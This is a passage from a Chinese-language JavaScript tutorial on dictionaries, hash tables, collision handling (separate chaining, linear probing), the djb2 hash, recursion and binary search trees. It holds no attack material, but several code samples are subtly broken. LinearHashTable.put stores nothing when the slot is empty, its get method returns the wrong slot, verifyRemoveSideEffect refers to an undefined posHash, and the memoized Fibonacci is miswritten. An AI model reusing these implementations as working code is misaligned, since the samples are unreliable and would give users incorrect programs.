    <span>return</span> <span>this</span><span>.</span>table<span>[</span><span>this</span><span>.</span><span>toStrFn</span><span>(</span>key<span>)</span><span>]</span> <span>!=</span> <span>null</span>
  <span>}</span>
  <span>// 在字典和 ValuePair 类中设置键和值</span>
  <span>set</span><span>(</span>key<span>,</span> value<span>)</span> <span>{</span>
    <span>if</span> <span>(</span>key <span>!=</span> <span>null</span> <span>&amp;&amp;</span> value <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>const</span> tableKey <span>=</span> <span>this</span><span>.</span><span>toStrFn</span><span>(</span>key<span>)</span>
      <span>this</span><span>.</span>table<span>[</span>tableKey<span>]</span> <span>=</span> <span>new</span> <span>ValuePair</span><span>(</span>key<span>,</span> value<span>)</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>// 从字典中移除一个值</span>
  <span>remove</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>hasKey</span><span>(</span>key<span>)</span><span>)</span> <span>{</span>
      <span>delete</span> <span>this</span><span>.</span>table<span>[</span><span>this</span><span>.</span><span>toStrFn</span><span>(</span>key<span>)</span><span>]</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>// 从字典中检索一个值</span>
  <span>get</span><span>(</span>key<span>)</span> <span>{</span>
    <span>const</span> valuePair <span>=</span> <span>this</span><span>.</span>table<span>[</span><span>this</span><span>.</span><span>toStrFn</span><span>(</span>key<span>)</span><span>]</span>
    <span>return</span> valuePair <span>==</span> <span>null</span> <span>?</span> <span>undefined</span> <span>:</span> valuePair<span>.</span>value
  <span>}</span>
  <span>// 获取所有键、值</span>
  <span>keyValues</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> Object<span>.</span><span>values</span><span>(</span><span>this</span><span>.</span>table<span>)</span>
  <span>}</span>
  <span>// 获取所有键</span>
  <span>keys</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>keyValues</span><span>(</span><span>)</span><span>.</span><span>map</span><span>(</span><span>valuePair</span> <span>=></span> valuePair<span>.</span>key<span>)</span>
  <span>}</span>
  <span>// 获取所有值</span>
  <span>values</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>keyValues</span><span>(</span><span>)</span><span>.</span><span>map</span><span>(</span><span>valuePair</span> <span>=></span> valuePair<span>.</span>value<span>)</span>
  <span>}</span>
  <span>// 用 forEach 迭代字典中的每个键值对</span>
  <span>forEach</span><span>(</span><span>callbackFn</span><span>)</span> <span>{</span>
    <span>const</span> valuePairs <span>=</span> <span>this</span><span>.</span><span>keyValues</span><span>(</span><span>)</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> valuePairs<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>const</span> result <span>=</span> <span>callbackFn</span><span>(</span>valuePairs<span>[</span>i<span>]</span><span>.</span>key<span>,</span> valuePairs<span>[</span>i<span>]</span><span>.</span>value<span>)</span>
      <span>if</span> <span>(</span>result <span>===</span> <span>false</span><span>)</span> <span>{</span>
        <span>break</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
  <span>// 获取字典长度</span>
  <span>size</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> Object<span>.</span><span>keys</span><span>(</span><span>this</span><span>.</span>table<span>)</span><span>.</span>length
  <span>}</span>
  <span>// 检查字典是否为空</span>
  <span>isEmpty</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>===</span> <span>0</span>
  <span>}</span>
  <span>// 清空字典</span>
  <span>clear</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>table <span>=</span> <span>{</span><span>}</span>
  <span>}</span>
  <span>toString</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>''</span>
    <span>}</span>
    <span>const</span> valuePairs <span>=</span> <span>this</span><span>.</span><span>keyValues</span><span>(</span><span>)</span>
    <span>let</span> objString <span>=</span> <span><span>`</span><span><span>${</span>valuePairs<span>[</span><span>0</span><span>]</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>}</span></span><span>`</span></span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>1</span><span>;</span> i <span>&lt;</span> valuePairs<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      objString <span>=</span> <span><span>`</span><span><span>${</span>objString<span>}</span></span><span>,</span><span><span>${</span>valuePairs<span>[</span>i<span>]</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>}</span></span><span>`</span></span>
    <span>}</span>
    <span>return</span> objString
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br></div></div><h2 id="_13-散列表"> 13. 散列表</h2>
<ul>
<li>
<p>散列算法的作用是尽可能快地在数据结构中找到一个值。在之前的章节中，你已经知道如果要在数据结构中获得一个值（使用 get 方法），需要迭代整个数据结构来找到它。如果使用散列函数，就知道值的具体位置，因此能够快速检索到该值。散列函数的作用是给定一个键值，然后返回值在表中的地址。</p>
</li>
<li>
<p>散列表有一些在计算机科学中应用的例子。因为它是字典的一种实现，所以可以用作关联数组。它也可以用来对数据库进行索引。当我们在关系型数据库（如 MySQL、Microsoft SQL Server、Oracle，等等）中创建一个新的表时，一个不错的做法是同时创建一个索引来更快地查询到记录的 key 。在这种情况下，散列表可以用来保存键和对表中记录的引用。另一个很常见的应用是使用散列表来表示对象。JavaScript 语言内部就是使用散列表来表示每个对象。此时，对象的每个属性和方法（成员）被存储为 key 对象类型，每个 key 指向对应的对象成员。</p>
</li>
</ul>
<div><pre><code><span>class</span> <span>HashTable</span> <span>{</span>
  <span>constructor</span><span>(</span><span>toStrFn <span>=</span> defaultToString</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>toStrFn <span>=</span> toStrFn
    <span>this</span><span>.</span>table <span>=</span> <span>{</span><span>}</span>
  <span>}</span>
  <span>// 散列函数</span>
  <span>loseloseHashCode</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>typeof</span> key <span>===</span> <span>'number'</span><span>)</span> <span>{</span>
      <span>return</span> key
    <span>}</span>
    <span>const</span> tableKey <span>=</span> <span>this</span><span>.</span><span>toStrFn</span><span>(</span>key<span>)</span>
    <span>let</span> hash <span>=</span> <span>0</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> tableKey<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      hash <span>+=</span> tableKey<span>.</span><span>charCodeAt</span><span>(</span>i<span>)</span>
    <span>}</span>
    <span>return</span> hash <span>%</span> <span>37</span>
  <span>}</span>
  <span>hashCode</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>loseloseHashCode</span><span>(</span>key<span>)</span>
  <span>}</span>
  <span>// 将键和值加入散列表</span>
  <span>put</span><span>(</span><span>key<span>,</span> value</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>key <span>!=</span> <span>null</span> <span>&amp;&amp;</span> value <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>const</span> position <span>=</span> <span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span>
      <span>this</span><span>.</span>table<span>[</span>position<span>]</span> <span>=</span> <span>new</span> <span>ValuePair</span><span>(</span>key<span>,</span> value<span>)</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>// 从散列表中获取一个值</span>
  <span>get</span><span>(</span>key<span>)</span> <span>{</span>
    <span>const</span> valuePair <span>=</span> <span>this</span><span>.</span>table<span>[</span><span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span><span>]</span>
    <span>return</span> valuePair <span>==</span> <span>null</span> <span>?</span> <span>undefined</span> <span>:</span> valuePair<span>.</span>value
  <span>}</span>
  <span>// 从散列表中移除一个值</span>
  <span>remove</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>const</span> hash <span>=</span> <span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span>
    <span>const</span> valuePair <span>=</span> <span>this</span><span>.</span>table<span>[</span>hash<span>]</span>
    <span>if</span> <span>(</span>valuePair <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>delete</span> <span>this</span><span>.</span>table<span>[</span>hash<span>]</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br></div></div><h2 id="_14-处理散列表中的冲突"> 14. 处理散列表中的冲突</h2>
<p>1.分离链接：分离链接法包括为散列表的每一个位置创建一个链表并将元素存储在里面。它是解决冲突的最简单的方法，但是在 HashTable 实例之外还需要额外的存储空间。</p>
<img :src="$withBase('/images/JS-Algorithms/散列表-分离链接.png')" loading="lazy">
<div><pre><code><span>class</span> <span>SeparateHashTable</span> <span>extends</span> <span>HashTable</span> <span>{</span>
  <span>put</span><span>(</span><span>key<span>,</span> value</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>key <span>!=</span> <span>null</span> <span>&amp;&amp;</span> value <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>const</span> position <span>=</span> <span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>position<span>]</span> <span>==</span> <span>null</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>table<span>[</span>position<span>]</span> <span>=</span> <span>new</span> <span>LinkedList</span><span>(</span><span>)</span>
      <span>}</span>
      <span>this</span><span>.</span>table<span>[</span>position<span>]</span><span>.</span><span>push</span><span>(</span><span>new</span> <span>ValuePair</span><span>(</span>key<span>,</span> value<span>)</span><span>)</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>get</span><span>(</span>key<span>)</span> <span>{</span>
    <span>const</span> position <span>=</span> <span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span>
    <span>const</span> linkedList <span>=</span> <span>this</span><span>.</span>table<span>[</span>position<span>]</span>
    <span>if</span> <span>(</span>linkedList <span>!=</span> <span>null</span> <span>&amp;&amp;</span> <span>!</span>linkedList<span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>let</span> current <span>=</span> linkedList<span>.</span><span>getHead</span><span>(</span><span>)</span>
      <span>while</span> <span>(</span>current <span>!=</span> <span>null</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>current<span>.</span>element<span>.</span>key <span>===</span> key<span>)</span> <span>{</span>
          <span>return</span> current<span>.</span>element<span>.</span>value
        <span>}</span>
        current <span>=</span> current<span>.</span>next
      <span>}</span>
    <span>}</span>
    <span>return</span> <span>undefined</span>
  <span>}</span>
  <span>remove</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>const</span> position <span>=</span> <span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span>
    <span>const</span> linkedList <span>=</span> <span>this</span><span>.</span>table<span>[</span>position<span>]</span>
    <span>if</span> <span>(</span>linkedList <span>!=</span> <span>null</span> <span>&amp;&amp;</span> <span>!</span>linkedList<span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>let</span> current <span>=</span> linkedList<span>.</span><span>getHead</span><span>(</span><span>)</span>
      <span>while</span> <span>(</span>current <span>!=</span> <span>null</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>current<span>.</span>element<span>.</span>key <span>===</span> key<span>)</span> <span>{</span>
          linkedList<span>.</span><span>remove</span><span>(</span>current<span>.</span>element<span>)</span>
          <span>if</span> <span>(</span>linkedList<span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
            <span>delete</span> <span>this</span><span>.</span>table<span>[</span>position<span>]</span>
          <span>}</span>
          <span>return</span> <span>true</span>
        <span>}</span>
        current <span>=</span> current<span>.</span>next
      <span>}</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br></div></div><ol start="2">
<li>线性探查：另一种解决冲突的方法是线性探查。之所以称作线性，是因为它处理冲突的方法是将元素直接存储到表中，而不是在单独的数据结构中。</li>
</ol>
<blockquote>
<p>当想向表中某个位置添加一个新元素的时候，如果索引为 position 的位置已经被占据了，就尝试 position+1 的位置。如果 position+1 的位置也被占据了，就尝试 position+2 的位置，以此类推，直到在散列表中找到一个空闲的位置。想象一下，有一个已经包含一些元素的散列表，我们想要添加一个新的键和值。我们计算这个新键的 hash ，并检查散列表中对应的位置是否被占据。如果没有，我们就将该值添加到正确的位置。如果被占据了，我们就迭代散列表，直到找到一个空闲的位置。</p>
</blockquote>
<img :src="$withBase('/images/JS-Algorithms/散列表-线性探查.png')" loading="lazy">
<blockquote>
<p>线性探查技术分为两种。第一种是软删除方法。我们使用一个特殊的值（标记）来表示键值对被删除了（惰性删除或软删除），而不是真的删除它。经过一段时间，散列表被操作过后，我们会得到一个标记了若干删除位置的散列表。这会逐渐降低散列表的效率，因为搜索键值会随时间变得更慢。能快速访问并找到一个键是我们使用散列表的一个重要原因。</p>
</blockquote>
<img :src="$withBase('/images/JS-Algorithms/散列表-线性探查-软删除.png')" loading="lazy">
<blockquote>
<p>第二种方法需要检验是否有必要将一个或多个元素移动到之前的位置。当搜索一个键的时候，这种方法可以避免找到一个空位置。如果移动元素是必要的，我们就需要在散列表中挪动键值对。</p>
</blockquote>
<img :src="$withBase('/images/JS-Algorithms/散列表-线性探查-移动元素.png')" loading="lazy">
<div><pre><code><span>class</span> <span>LinearHashTable</span> <span>extends</span> <span>HashTable</span> <span>{</span>
  <span>put</span><span>(</span><span>key<span>,</span> value</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>key <span>!=</span> <span>null</span> <span>&amp;&amp;</span> value <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>const</span> position <span>=</span> <span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>position<span>]</span> <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>let</span> index <span>=</span> position <span>+</span> <span>1</span>
        <span>while</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>index<span>]</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
          index<span>++</span>
        <span>}</span>
        <span>this</span><span>.</span>table<span>[</span>index<span>]</span> <span>=</span> <span>new</span> <span>ValuePair</span><span>(</span>key<span>,</span> value<span>)</span>
      <span>}</span>
      <span>return</span> <span>true</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>get</span><span>(</span>key<span>)</span> <span>{</span>
    <span>const</span> position <span>=</span> <span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>position<span>]</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>position<span>]</span><span>.</span>key <span>===</span> key<span>)</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span>table<span>[</span>position<span>]</span><span>.</span>value
      <span>}</span>
      <span>let</span> index <span>=</span> position <span>+</span> <span>1</span>
      <span>while</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>index<span>]</span> <span>!=</span> <span>null</span> <span>&amp;&amp;</span> <span>this</span><span>.</span>table<span>[</span>index<span>]</span><span>.</span>key <span>!==</span> key<span>)</span> <span>{</span>
        index<span>++</span>
      <span>}</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>index<span>]</span> <span>!=</span> <span>null</span> <span>&amp;&amp;</span> <span>this</span><span>.</span>table<span>[</span>index<span>]</span><span>.</span>key <span>===</span> key<span>)</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span>table<span>[</span>position<span>]</span><span>.</span>value
      <span>}</span>
    <span>}</span>
    <span>return</span> <span>undefined</span>
  <span>}</span>
  <span>remove</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>const</span> position <span>=</span> <span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>position<span>]</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>position<span>]</span><span>.</span>key <span>===</span> key<span>)</span> <span>{</span>
        <span>delete</span> <span>this</span><span>.</span>table<span>[</span>position<span>]</span>
        <span>this</span><span>.</span><span>verifyRemoveSideEffect</span><span>(</span>key<span>,</span> position<span>)</span>
        <span>return</span> <span>true</span>
      <span>}</span>
      <span>let</span> index <span>=</span> position <span>+</span> <span>1</span>
      <span>while</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>index<span>]</span> <span>!=</span> <span>null</span> <span>&amp;&amp;</span> <span>this</span><span>.</span>table<span>[</span>index<span>]</span><span>.</span>key <span>!==</span> key<span>)</span> <span>{</span>
        index<span>++</span>
      <span>}</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>index<span>]</span> <span>!=</span> <span>null</span> <span>&amp;&amp;</span> <span>this</span><span>.</span>table<span>[</span>index<span>]</span><span>.</span>key <span>===</span> key<span>)</span> <span>{</span>
        <span>delete</span> <span>this</span><span>.</span>table<span>[</span>index<span>]</span>
        <span>this</span><span>.</span><span>verifyRemoveSideEffect</span><span>(</span>key<span>,</span> index<span>)</span>
        <span>return</span> <span>true</span>
      <span>}</span>
    <span>}</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>verifyRemoveSideEffect</span><span>(</span><span>key<span>,</span> removedPosition</span><span>)</span> <span>{</span>
    <span>const</span> hash <span>=</span> <span>this</span><span>.</span><span>hashCode</span><span>(</span>key<span>)</span>
    <span>let</span> index <span>=</span> removedPosition <span>+</span> <span>1</span>
    <span>while</span> <span>(</span><span>this</span><span>.</span>table<span>[</span>index<span>]</span> <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>posHash <span>&lt;=</span> hash <span>||</span> posHash <span>&lt;=</span> removedPosition<span>)</span> <span>{</span>
        <span>this</span><span>.</span>table<span>[</span>removedPosition<span>]</span> <span>=</span> <span>this</span><span>.</span>table<span>[</span>index<span>]</span>
        <span>delete</span> <span>this</span><span>.</span>table<span>[</span>index<span>]</span>
        removedPosition <span>=</span> index
      <span>}</span>
      index<span>++</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br></div></div><h2 id="_15-创建更好的散列函数"> 15. 创建更好的散列函数</h2>
<div><pre><code><span>djb2HashCode</span><span>(</span><span>key</span><span>)</span> <span>{</span>
  <span>const</span> tableKey <span>=</span> <span>this</span><span>.</span><span>toStrFn</span><span>(</span>key<span>)</span>
  <span>let</span> hash <span>=</span> <span>5381</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> tableKey<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    hash <span>=</span> hash <span>*</span> <span>33</span> <span>+</span> tableKey<span>.</span><span>charCodeAt</span><span>(</span>i<span>)</span>
  <span>}</span>
  <span>return</span> hash <span>%</span> <span>1013</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_16-递归"> 16. 递归</h2>
<ul>
<li>
<p>“要理解递归，首先要理解递归。” —— 佚名</p>
</li>
<li>
<p>阶乘。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>factorial</span><span>(</span><span>n</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>n <span>===</span> <span>1</span> <span>||</span> n <span>===</span> <span>0</span><span>)</span> <span>{</span>
    <span>return</span> <span>1</span>
  <span>}</span>
  <span>return</span> n <span>*</span> <span>factorial</span><span>(</span>n <span>-</span> <span>1</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><ul>
<li>斐波那契数。</li>
</ul>
<div><pre><code><span>function</span> <span>fibonacci</span><span>(</span><span>n</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>n <span>&lt;</span> <span>1</span><span>)</span> <span>return</span> <span>0</span>
  <span>if</span> <span>(</span>n <span>&lt;=</span> <span>2</span><span>)</span> <span>return</span> <span>1</span>
  <span>return</span> <span>fibonacci</span><span>(</span>n <span>-</span> <span>1</span><span>)</span> <span>+</span> <span>fibonacci</span><span>(</span>n <span>-</span> <span>2</span><span>)</span>
<span>}</span>

<span>// 记忆化斐波那契数</span>
<span>function</span> <span>fibonacciMemoization</span><span>(</span><span>n</span><span>)</span> <span>{</span>
  <span>const</span> memo <span>=</span> <span>[</span><span>0</span><span>,</span> <span>1</span><span>]</span>
  <span>const</span> <span>fibonacci</span> <span>=</span> <span>n</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>memo<span>[</span>n<span>]</span> <span>!=</span> <span>null</span><span>)</span> <span>return</span> memo<span>[</span>n<span>]</span>
    <span>return</span> <span>(</span>memo<span>[</span>n<span>]</span> <span>=</span> <span>fibonacci</span><span>(</span>n <span>-</span> <span>1</span><span>,</span> memo<span>)</span> <span>+</span> <span>fibonacci</span><span>(</span>n <span>-</span> <span>2</span><span>,</span> memo<span>)</span><span>)</span>
  <span>}</span>
  <span>return</span> fibonacci
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h2 id="_17-二叉树和二叉搜索树"> 17. 二叉树和二叉搜索树</h2>
<ul>
<li>
<p>二叉树：二叉树中的节点最多只能有两个子节点：一个是左侧子节点，另一个是右侧子节点。这个定义有助于我们写出更高效地在树中插入、查找和删除节点的算法。二叉树在计算机科学中的应用非常广泛。</p>
</li>
<li>
<p>二叉搜索树：二叉搜索树（BST）是二叉树的一种，但是只允许你在左侧节点存储（比父节点）小的值，在右侧节点存储（比父节点）大的值。</p>
</li>
</ul>
<img :src="$withBase('/images/JS-Algorithms/二叉搜索树.png')" loading="lazy">
<h2 id="_18-创建-binarysearchtree-类"> 18. 创建 BinarySearchTree 类</h2>
<div><pre><code><span>class</span> <span>Node</span> <span>{</span>
  <span>constructor</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>key <span>=</span> key <span>// 节点值</span>
    <span>this</span><span>.</span>left <span>=</span> <span>null</span> <span>// 左侧子节点引用</span>
    <span>this</span><span>.</span>right <span>=</span> <span>null</span> <span>// 右侧子节点引用</span>
  <span>}</span>
<span>}</span>

<span>default</span> <span>class</span> <span>BinarySearchTree</span> <span>{</span>
  <span>constructor</span><span>(</span><span>compareFn <span>=</span> defaultCompare</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>compareFn <span>=</span> compareFn <span>// 用来比较节点值</span>
    <span>this</span><span>.</span>root <span>=</span> <span>null</span> <span>// Node 类型的根节点</span>
  <span>}</span>
  <span>// 向二叉搜索树中插入一个键</span>
  <span>insert</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>root <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>root <span>=</span> <span>new</span> <span>Node</span><span>(</span>key<span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>this</span><span>.</span><span>insertNode</span><span>(</span><span>this</span><span>.</span>root<span>,</span> key<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>insertNode</span><span>(</span><span>node<span>,</span> key</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>LESS_THAN</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>node<span>.</span>left <span>==</span> <span>null</span><span>)</span> <span>{</span>
        node<span>.</span>left <span>=</span> <span>new</span> <span>Node</span><span>(</span>key<span>)</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>this</span><span>.</span><span>insertNode</span><span>(</span>node<span>.</span>left<span>,</span> key<span>)</span>
      <span>}</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>if</span> <span>(</span>node<span>.</span>right <span>==</span> <span>null</span><span>)</span> <span>{</span>
        node<span>.</span>right <span>=</span> <span>new</span> <span>Node</span><span>(</span>key<span>)</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>this</span><span>.</span><span>insertNode</span><span>(</span>node<span>.</span>right<span>,</span> key<span>)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
